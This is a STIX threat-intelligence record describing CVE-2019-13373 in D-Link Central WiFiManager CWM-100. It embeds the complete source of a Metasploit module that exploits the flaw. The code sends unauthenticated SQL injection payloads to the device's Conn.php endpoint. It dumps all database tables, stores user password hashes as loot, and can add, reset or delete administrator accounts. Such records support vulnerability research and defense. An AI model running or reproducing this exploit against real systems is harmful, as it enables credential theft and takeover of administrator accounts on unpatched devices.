{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--bb146c4c-bced-4e20-8c28-81a856051dea",
    "created": "2024-08-14T16:22:01.759425Z",
    "modified": "2024-08-14T16:22:01.75943Z",
    "name": "D-Link Central WiFiManager SQL injection",
    "description": " This module exploits a SQLi vulnerability found in D-Link Central WiFi Manager CWM(100) before v1.03R0100_BETA6. The vulnerability is an exposed API endpoint that allows the execution of SQL queries without authentication, using this vulnerability, it's possible to retrieve usernames and password hashes of registered users device configuration, and other data, it's also possible to add users or edit database informations.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/sqli/dlink/dlink_central_wifimanager_sqli.rb",
            "external_id": "dlink_central_wifimanager_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-13373"
        },
        {
            "source_name": "reference",
            "url": "https://unh3x.github.io/2019/02/21/D-link-(CWM-100)-Multiple-Vulnerabilities/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'csv'\nrequire 'digest'\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::SQLi\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'D-Link Central WiFiManager SQL injection',\n        'Description' => %q{\n          This module exploits a SQLi vulnerability found in\n          D-Link Central WiFi Manager CWM(100) before v1.03R0100_BETA6. The\n          vulnerability is an exposed API endpoint that allows the execution\n          of SQL queries without authentication, using this vulnerability, it's\n          possible to retrieve usernames and password hashes of registered users,\n          device configuration, and other data, it's also possible to add users,\n          or edit database informations.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'M3@ZionLab from DBAppSecurity',\n          'Redouane NIBOUCHA <rniboucha[at]yahoo.fr>' # Metasploit module\n        ],\n        'References' => [\n          ['CVE', '2019-13373'],\n          ['URL', 'https://unh3x.github.io/2019/02/21/D-link-(CWM-100)-Multiple-Vulnerabilities/']\n        ],\n        'Actions' => [\n          [ 'SQLI_DUMP', { 'Description' => 'Retrieve all the data from the database' } ],\n          [ 'ADD_ADMIN', { 'Description' => 'Add an administrator user' } ],\n          [ 'REMOVE_ADMIN', { 'Description' => 'Remove an administrator user' } ]\n        ],\n        'DefaultOptions' => { 'SSL' => true },\n        'DefaultAction' => 'SQLI_DUMP',\n        'DisclosureDate' => '2019-07-06',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'SideEffects' => [CONFIG_CHANGES, IOC_IN_LOGS],\n          'Reliability' => []\n        }\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('TARGETURI', [true, 'The base path to DLink CWM-100', '/']),\n        OptString.new('USERNAME', [false, 'The username of the user to add/remove']),\n        OptString.new('PASSWORD', [false, 'The password of the user to add/edit'])\n      ]\n    )\n  end\n\n  def vulnerable_request(payload)\n    send_request_cgi(\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri, 'Public', 'Conn.php'),\n      'vars_post' => {\n        'dbAction' => 'S',\n        'dbSQL' => payload\n      }\n    )\n  end\n\n  def check\n    check_error = nil\n    sqli = create_sqli(dbms: PostgreSQLi::Common, opts: { encoder: :base64 }) do |payload|\n      res = vulnerable_request(payload)\n      if res && res.code == 200\n        res.body[%r{<column>(.+)</column>}m, 1] || ''\n      else\n        if res\n          check_error = Exploit::CheckCode::Safe\n        else\n          check_error = Exploit::CheckCode::Unknown('Failed to send HTTP request')\n        end\n        '' # because a String is expected, this will make test_vulnerable to return false, but we will just get check_error\n      end\n    end\n    vulnerable_test = sqli.test_vulnerable\n    check_error || (vulnerable_test ? Exploit::CheckCode::Vulnerable : Exploit::CheckCode::Safe)\n  end\n\n  def dump_data(sqli)\n    print_good \"DBMS version: #{sqli.version}\"\n    table_names = sqli.enum_table_names\n    print_status 'Enumerating tables'\n    table_names.each do |table_name|\n      cols = sqli.enum_table_columns(table_name)\n      vprint_good \"#{table_name}(#{cols.join(',')})\"\n      # retrieve the data from the table\n      content = sqli.dump_table_fields(table_name, cols)\n      # store hashes as credentials\n      if table_name == 'usertable'\n        user_ind = cols.index('username')\n        pass_ind = cols.index('userpassword')\n        content.each do |entry|\n          create_credential(\n            {\n              module_fullname: fullname,\n              workspace_id: myworkspace_id,\n              username: entry[user_ind],\n              private_data: entry[pass_ind],\n              jtr_format: 'raw-md5',\n              private_type: :nonreplayable_hash,\n              status: Metasploit::Model::Login::Status::UNTRIED\n            }.merge(service_details)\n          )\n          print_good \"Saved credentials for #{entry[user_ind]}\"\n        end\n      end\n      path = store_loot(\n        'dlink.http',\n        'application/csv',\n        rhost,\n        cols.to_csv + content.map(&:to_csv).join,\n        \"#{table_name}.csv\"\n      )\n      print_good \"#{table_name} saved to #{path}\"\n    end\n  end\n\n  def check_admin_username\n    if datastore['USERNAME'].nil?\n      fail_with Failure::BadConfig, 'You must specify a username when adding a user'\n    elsif ['\\\\', '\\''].any? { |c| datastore['USERNAME'].include?(c) }\n      fail_with Failure::BadConfig, 'Admin username cannot contain single quotes or backslashes'\n    end\n  end\n\n  def add_user(sqli)\n    check_admin_username\n    admin_hash = Digest::MD5.hexdigest(datastore['PASSWORD'] || '')\n    user_exists_sql = \"select count(1) from usertable where username='#{datastore['USERNAME']}'\"\n    # check if user exists, if yes, just change his password\n    if sqli.run_sql(user_exists_sql).to_i == 0\n      print_status 'User not found on the target, inserting'\n      sqli.run_sql('insert into usertable(username,userpassword,level) values(' \\\n      \"'#{datastore['USERNAME']}', '#{admin_hash}', 1)\")\n    else\n      print_status 'User already exists, updating the password'\n      sqli.run_sql(\"update usertable set userpassword='#{admin_hash}' where \" \\\n      \"username='#{datastore['USERNAME']}'\")\n    end\n  end\n\n  def remove_user(sqli)\n    check_admin_username\n    sqli.run_sql(\"delete from usertable where username='#{datastore['USERNAME']}'\")\n  end\n\n  def run\n    unless check == Exploit::CheckCode::Vulnerable\n      print_error 'Target does not seem to be vulnerable'\n      return\n    end\n    print_good 'Target seems vulnerable'\n    sqli = create_sqli(dbms: PostgreSQLi::Common, opts: { encoder: :base64 }) do |payload|\n      res = vulnerable_request(payload)\n      if res && res.code == 200\n        res.body[%r{<column>(.+)</column>}m, 1] || ''\n      else\n        fail_with Failure::Unreachable, 'Failed to send HTTP request' unless res\n        fail_with Failure::NotVulnerable, \"Got #{res.code} response code\" unless res.code == 200\n      end\n    end\n    case action.name\n    when 'SQLI_DUMP'\n      dump_data(sqli)\n    when 'ADD_ADMIN'\n      add_user(sqli)\n    when 'REMOVE_ADMIN'\n      remove_user(sqli)\n    else\n      fail_with(Failure::BadConfig, \"#{action.name} not defined\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-07-06"
}